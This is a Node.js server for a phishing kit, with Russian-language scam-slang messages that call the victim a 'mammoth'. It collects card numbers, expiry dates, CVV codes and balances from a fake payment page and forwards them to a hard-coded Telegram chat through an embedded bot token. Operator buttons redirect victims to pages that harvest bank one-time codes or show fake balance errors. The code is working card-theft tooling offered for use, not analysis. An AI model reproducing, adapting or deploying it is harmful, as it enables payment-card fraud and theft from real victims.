const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(express.static(__dirname));
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('5797940789:AAGKjmuYUEDi-ktiTeU3OgaWUM6rMvXMqbo', { polling: true });
const userSockets = {};

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
  const userId = generateUserId();
  const userIp = socket.handshake.address.replace('::ffff:', '').replace(/\./g, ''); // Удаление '::ffff:' и точек

  socket.emit('user_connected', { userId, ip: userIp });

  // Save the socket for this userId
  userSockets[userId] = socket;

  console.log(`ID ${userId} подключен, IP: ${userIp}`);

  // Listen for card data from the client
  socket.on('card_data', (data) => {
    const message = `🦣Дал Лог\n🔒 Номер: <pre>${data.cardNumber}</pre>\n🔒 Срок: <pre>${data.expMonth}/${data.expYear}</pre>\n🔒 cvc: <pre>${data.cvv}</pre>\n🔒 Баланс: <pre>${data.balance}</pre>\n🌐`;


    const inlineKeyboard = [
      [
        { text: '✉️ КОД', callback_data: `button_cod_${userId}` },
      ],
      [
        { text: '💸 Фейк Баланс', callback_data: `fake_balance_${userId}` },
      ],
    ];

    bot.sendMessage('-1001858916904', message, {
      parse_mode: 'HTML', // Указываем, что используем HTML для форматирования
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  });

  socket.on('cod', (data) => {
    const message = `Введен код\n🔒 Номер: <pre>${data.codNumber}</pre>\n🆔 ID: <pre>${userId}</pre>`;

    const inlineKeyboard = [
      [
        { text: '❌НЕ ВЕРНЫЙ КОД', callback_data: `button_push_${userId}` }
      ]
    ];

    bot.sendMessage('-1001858916904', message, {
      parse_mode: 'HTML', // Указываем, что используем HTML для форматирования
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  });

  socket.on('invalid_cod', (data) => {
    const message = `🦣Мамонт дал\nновый код\n🔒 КОД: <pre>${data.codNumber}</pre>\n🆔 ID: <pre>${userIp}</pre>`;

    const inlineKeyboard = [
      [
        { text: '❌НЕ ВЕРНЫЙ КОД', callback_data: `button_push_${userId}` }
      ]
    ];

    bot.sendMessage('-1001858916904', message, {
      parse_mode: 'HTML', // Указываем, что используем HTML для форматирования
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  });


  socket.on('disconnect', () => {
    console.log(`ID ${userId} отебнул`);

  });
});


bot.on('callback_query', (query) => {
  const userId = query.data.split('_')[2];

  if (query.data.startsWith('button_cod')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('user_redirect', userId);
    }

    bot.sendMessage(-1001858916904, `Мамонот\nПеренаправлен на ввод Кода`);
  }

  if (query.data.startsWith('button_push')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('user_redirect_push', userId);
    }

    bot.sendMessage(-1001858916904, `Мамонот\nУспешно Перенаправлен на ПУШ`);
  }

  if (query.data.startsWith('fake_balance')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('fake_balance', userId);

      bot.sendMessage(-1001858916904, `Мамонотy\nУспешно выведена ошыбка `);
    }

    if (query.data.startsWith('invalid_cod')) {
      const userSocket = userSockets[userId];
      if (userSocket) {
        userSocket.emit('invalid_cod', userId);

        bot.sendMessage(-1001858916904, `Мамонотy\nУспешно выведена ошыбка об не верном коде `);
      }





    }
  }
});




// Generate UserID
function generateUserId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

app.get('/push', (req, res) => {
  res.sendFile(__dirname + '/pAU.html');
});

const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
